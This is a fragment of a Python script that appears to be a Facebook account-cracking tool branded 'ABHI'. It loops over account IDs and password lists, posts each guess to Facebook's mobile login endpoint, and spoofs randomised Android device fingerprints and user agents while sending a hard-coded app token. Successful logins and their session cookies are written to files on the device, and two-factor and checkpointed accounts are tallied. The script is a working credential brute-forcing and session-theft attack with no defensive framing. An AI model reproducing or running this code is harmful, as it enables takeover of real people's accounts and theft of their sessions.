                        'X-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                        'X-fb-device-group': '5120',
                        'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                        'X-FB-Request-Analytics-Tags': 'graphservice',
                        'X-FB-HTTP-Engine': 'Liger',
                        'X-FB-Client-IP': 'True',
                        'X-FB-Server-Cluster': 'True',
                        'X-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                        url1= 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url=url1,data=data,headers=head).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [ABHI-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/ABHI-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/ABHI-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[ABHI-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error_msg']:
                                        if 'y' in pcp:
                                                print('\r\r\033[1;91m [ABHI-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/ABHI-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/ABHI-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                continue
                loop+=1
        except requests.exceptions.ConnectionError:
                        time.sleep(10)
        except Exception as e:
                        pass
def rndm(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [ABHI-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,450)}.0.0.{random.randint(11,60)}.{random.randint(70,200)}'
                        fbbv = str(random.randint(111111111,444444444))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        yaami = random.choice(['SM-TL10', 'SM-TL00', 'SM-L09', 'SM-CL00', 'SM-UL00', 'SM-J1', 'GT-TL10', 'GT-TL00', 'GT-L09', 'GT-CL00', 'GT-UL00', 'GT-J1', 'SGH-TL10', 'SGH-TL00', 'SGH-L09', 'SGH-CL00', 'SGH-UL00', 'SGH-J1', 'SHV-TL10', 'SHV-TL00', 'SHV-L09', 'SHV-CL00', 'SHV-UL00', 'SHV-J1', 'SPH-TL10', 'SPH-TL00', 'SPH-L09', 'SPH-CL00', 'SPH-UL00', 'SPH-J1', 'SCH-TL10', 'SCH-TL00', 'SCH-L09', 'SCH-CL00', 'SCH-UL00', 'SCH-J1', 'MT-TL10', 'MT-TL00', 'MT-L09', 'MT-CL00', 'MT-UL00', 'MT-J1'])
                        #ua = '[FBAN/FB4A;FBAV/'+str(random.randint(111,999))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/'+str(random.randint(50,200))+'.0.0.'+str(random.randint(11,49))+'.120;FBBV/'+str(random.randint(111111111,999999999))+';FBDM/{density=2'+'.0,width='+'720,height='+'1440};FBLC/en_US;FBRV/'+str(random.randint(111111111,999999999))+';FBCR/Zong;FBMF/nokia;FBBD/nokia;FBPN/com.facebook.katana;FBDV/TA-'+str(random.randint(1000,1500))+';FBSV/'+str(random.randint(4,13))+'.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        device_id = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(string.digits) for _ in range(2))
                        jazoest = li2+j1
                        data={
                        'adid': adid,
                        'format': 'json',
                        'device_id': str(uuid.uuid4()),
                        'email': ids,
                        'password': pas,
                        'generate_analytics_claims': '1',
                        'community_id': '',
                        'cpl': 'true',
                        'try_num': '1',
                        'family_device_id': str(uuid.uuid4()),
                        'credentials_type': 'password',
                        'source': 'login',
                        'error_detail_type': 'button_with_disabled',
                        'enroll_misauth': 'false',
                        'generate_session_cookies': '1',
                        'generate_machine_id': '1',
                        'currently_logged_in_userid': '0',
                        'locale': 'en_GB',
                        'client_country_code': 'GB',
                        'fb_api_req_friendly_name': 'authenticate'}

                        head={
                        'User-Agent': abhijhirwal1(),
                        'Accept-Encoding':  'gzip, deflate',
                        'Accept': '*/*',
                        'Connection': 'keep-alive',
                        'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                        'X-FB-Friendly-Name': 'authenticate',
                        'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),
                        'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                        'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                        'X-FB-Connection-Type': 'unknown',
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'X-FB-HTTP-Engine': 'Liger'}

                        url1= 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url=url1,data=data,headers=head).json()
                        if 'session_key' in po:
                                try:
                                        uid = po['uid']
                                except:
                                        uid = ids
                                if str(uid) in oks:
                                        break
                                else:
                                        print('\r\r\033[1;32m [ABHI-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/ABHI-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/ABHI-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                        uid = po['error']['error_data']['uid']
                                except:
                                        uid = ids
                                if uid in oks:pass
                                else:
                                        print('\r\r\033[1;91m [ABHI-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ABHI-R-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
        except requests.exceptions.ConnectionError:
                        time.sleep(10)
        except Exception as e:
                        pass
try:
        menu()
except requests.exceptions.ConnectionError:
        print('\n No internet connection ...')
        exit()
except Exception as e:pass

menu()